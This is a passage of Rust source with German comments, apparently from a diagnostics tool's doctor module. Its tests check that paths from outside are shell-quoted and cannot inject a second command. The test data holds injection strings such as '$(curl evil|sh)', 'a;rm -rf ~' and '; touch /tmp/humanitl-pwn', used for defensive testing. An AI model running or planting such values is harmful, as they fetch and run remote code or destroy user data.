            checks::llm(&facts.llm),
            checks::tray(&facts.tray),
            checks::renderer(&facts.renderer),
            checks::disk_space(&facts.disk),
        ],
    }
}

/// Urteilt allein über die Zeile `daemon`.
///
/// Die beiden Zeilen, deren Tatsachen von außen kommen, brauchen ein Urteil,
/// das man einzeln bekommt: Wer den Daemon gerade selbst erreicht hat, weiß
/// mehr über diese Zeile als der Daemon, der den Bericht geschickt hat, und
/// ersetzt sie darin. Das Urteil bleibt trotzdem hier und wandert nicht in den
/// Client (ADR-018).
#[must_use]
pub fn daemon_line(facts: &DaemonFacts) -> CheckOutcome {
    checks::daemon(facts)
}

/// Urteilt allein über die Zeile `llm`; siehe [`daemon_line`].
#[must_use]
pub fn llm_line(facts: &LlmFacts) -> CheckOutcome {
    checks::llm(facts)
}

/// Der Befund für eine Netzprüfung, um die niemand gebeten hat.
///
/// Nicht `DOCTOR_012`: Dort konnte der Doctor nicht nachsehen, hier wollte er
/// nicht. Der Unterschied ist der Grund, aus dem dieses Modul überhaupt keine
/// Verbindung aufbaut, und er gehört in den Code des Befunds und nicht nur in
/// seinen Text.
fn not_contacted(endpoint: &str, command: &str) -> Diagnostic {
    // Auch dieser Befehl geht durch die Regel, obwohl er heute ein festes
    // Literal ist: Eine Zeile, die als `CopyCommand` hinausgeht, darf nicht
    // davon abhaengen, dass gerade niemand etwas hineingeschrieben hat.
    let words: Vec<&str> = command.split_whitespace().collect();
    Diagnostic::builder(DOCTOR_013, Severity::Warning)
        .why(format!(
            "{endpoint} was not contacted; humanitl doctor does not open a connection \
             unless it is asked to"
        ))
        .fix(command_fix(&words))
        .build()
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

    use std::collections::BTreeSet;

    use humanitl_core::FixAction;

    use super::{
        CheckId, CheckOutcome, CheckStatus, DoctorReport, Reading, RunOutcome, command_fix,
        shell_command,
    };

    #[test]
    fn every_check_id_has_its_own_name() {
        let names: BTreeSet<&str> = CheckId::ALL.iter().map(|id| id.as_str()).collect();
        assert_eq!(names.len(), CheckId::ALL.len(), "a name appears twice");
        for id in CheckId::ALL {
            assert!(
                id.as_str()
                    .chars()
                    .all(|c| c.is_ascii_lowercase() || c == '_'),
                "{id} is not snake_case"
            );
        }
    }

    #[test]
    fn a_check_that_could_not_run_is_never_ok() {
        let outcome = CheckOutcome::unmeasured(
            CheckId::Seccomp,
            "/proc/self/status could not be read",
            &["grep", "Seccomp", "/proc/self/status"],
        );
        assert_eq!(outcome.status(), CheckStatus::Warn);
        assert!(outcome.is_unmeasured(), "{}", outcome.evidence());
        let diagnostic = outcome.diagnostic().expect("a finding");
        assert_eq!(diagnostic.code.as_str(), "DOCTOR_012");
        assert!(diagnostic.why.contains("seccomp"), "{}", diagnostic.why);
        assert!(diagnostic.fix.is_some(), "an unmeasured line offers a way");
    }

    #[test]
    fn a_green_line_carries_no_finding_and_is_not_unmeasured() {
        let outcome = CheckOutcome::ok(CheckId::Bwrap, "bubblewrap 0.11.0");
        assert_eq!(outcome.status(), CheckStatus::Ok);
        assert!(outcome.diagnostic().is_none());
        assert!(!outcome.is_unmeasured());
    }

    #[test]
    fn the_worst_status_of_a_report_decides() {
        let report = DoctorReport {
            checks: vec![
                CheckOutcome::ok(CheckId::Bwrap, "x"),
                CheckOutcome::unmeasured(CheckId::Llm, "nobody asked", &["humanitl", "doctor"]),
            ],
        };
        assert_eq!(report.worst(), CheckStatus::Warn);
        assert!(!report.has_failure());
        assert_eq!(
            report.get(CheckId::Bwrap).map(CheckOutcome::status),
            Some(CheckStatus::Ok)
        );
        assert_eq!(report.get(CheckId::Seccomp), None);
    }

    #[test]
    fn fail_outranks_warn_outranks_ok() {
        assert!(CheckStatus::Fail > CheckStatus::Warn);
        assert!(CheckStatus::Warn > CheckStatus::Ok);
    }

    #[test]
    fn a_reading_says_why_it_is_missing() {
        let absent: Reading<String> = Reading::Absent;
        assert!(
            absent
                .missing_because()
                .expect("a reason")
                .contains("does not exist")
        );
        let unreadable: Reading<String> = Reading::Unreadable("EACCES".to_owned());
        assert!(
            unreadable
                .missing_because()
                .expect("a reason")
                .contains("EACCES")
        );
        assert_eq!(Reading::Found(1_u8).missing_because(), None);
        assert_eq!(Reading::Found(1_u8).found(), Some(&1));
    }

    /// Ein Wert von aussen wird nie durch Interpolation zu einem Befehl.
    ///
    /// Der Fall, den das Zweitreview genannt hat:
    /// `XDG_RUNTIME_DIR='/tmp/h; touch /tmp/humanitl-pwn'` ergaebe ohne diese
    /// Regel die kopierbare Zeile `chmod 700 /tmp/h; touch /tmp/humanitl-pwn`.
    #[test]
    fn a_path_from_outside_never_becomes_a_second_command() {
        let hostile = "/tmp/h; touch /tmp/humanitl-pwn";
        let command = shell_command(&["chmod", "700", hostile]).expect("quotable");
        assert_eq!(command, "chmod 700 '/tmp/h; touch /tmp/humanitl-pwn'");
        let words = shlex::split(&command).expect("the line parses");
        assert_eq!(
            words,
            vec!["chmod", "700", hostile],
            "three words, not five"
        );
    }

    #[test]
    fn every_shell_metacharacter_stays_inside_one_literal_word() {
        for raw in [
            "/w/pro ject",
            "/w/$(curl evil|sh)",
            "/w/`id`",
            "/w/a;rm -rf ~",
            "/w/a\"b",
            "/w/a|b",
            "/w/*",
            "/w/a&b",
            "/w/a$b",
            "/w/a>b<c",
            "/w/a\tb",
        ] {
            let command =
                shell_command(&["df", "-h", raw]).unwrap_or_else(|| panic!("{raw:?} is quotable"));
            let words = shlex::split(&command).unwrap_or_else(|| panic!("{command:?} parses"));
            assert_eq!(words, vec!["df", "-h", raw], "{raw:?}");
        }
    }

    /// Wo die Regel nicht greift, gibt es keinen Befehl — und keine Zeile, die
    /// etwas anderes taete, als sie zeigt.
    #[test]
    fn a_word_that_cannot_be_proven_yields_no_command_at_all() {
        // Fuer ein Wort mit `'` oder `\` liefert `shlex::try_quote` doppelte
        // Anfuehrungszeichen, und darin behalten `$`, Backtick, `\` und `"`
        // ihre Bedeutung. Solche Woerter werden abgelehnt, statt ihre Auslegung
        // nachzupruefen.
        assert_eq!(shell_command(&["rm", "/w/it's"]), None);
        assert_eq!(shell_command(&["rm", "/w/a\\b"]), None);
        // Und die Bedingung selbst, damit die Ablehnung nicht daran haengt,
        // welche Form `shlex` heute waehlt: Die Aufloesung eines enthaltenen
        // `'` als `'a'\''b'` ist kein woertliches Wort, auch wenn sie in einer
        // Shell dasselbe ergaebe.
        assert!(
            !super::is_literal_word("'/w/it'\\''s'", "/w/it's"),
            "the escaped form is refused instead of being checked"
        );
        assert!(super::is_literal_word("'/w/a b'", "/w/a b"));
        assert!(super::is_literal_word("/w/plain", "/w/plain"));
        assert!(
            !super::is_literal_word("\"/w/a\\\\b\"", "/w/a\\b"),
            "a double-quoted word is not literal"
        );
        // Steuerzeichen und Zeilenumbrueche aendert `sanitize_note`.
        assert_eq!(shell_command(&["rm", "/w/a\nb"]), None);
        assert_eq!(shell_command(&["rm", "/w/a\u{202e}b"]), None);
        // Ein leeres Wort und eine leere Liste sind kein Befehl.
        assert_eq!(shell_command(&["rm", ""]), None);
        assert_eq!(shell_command(&[]), None);

        // Und dann verweist der Vorschlag auf die Erklaerung.
        match command_fix(&["rm", "/w/it's"]) {
            FixAction::OpenUrl(url) => assert!(url.contains("DIAGNOSTICS.md"), "{url}"),
            other => panic!("a command that cannot be proven is no command: {other:?}"),
        }
    }

    #[test]
    fn a_timeout_is_not_a_success() {
        let timed_out = RunOutcome::TimedOut(std::time::Duration::from_secs(2));
        assert!(!timed_out.is_success());
        assert!(!RunOutcome::Exited(1).is_success());
        assert!(!RunOutcome::Signalled(9).is_success());
        assert!(RunOutcome::Exited(0).is_success());
        assert!(timed_out.describe().contains("2000 ms"));
    }
}
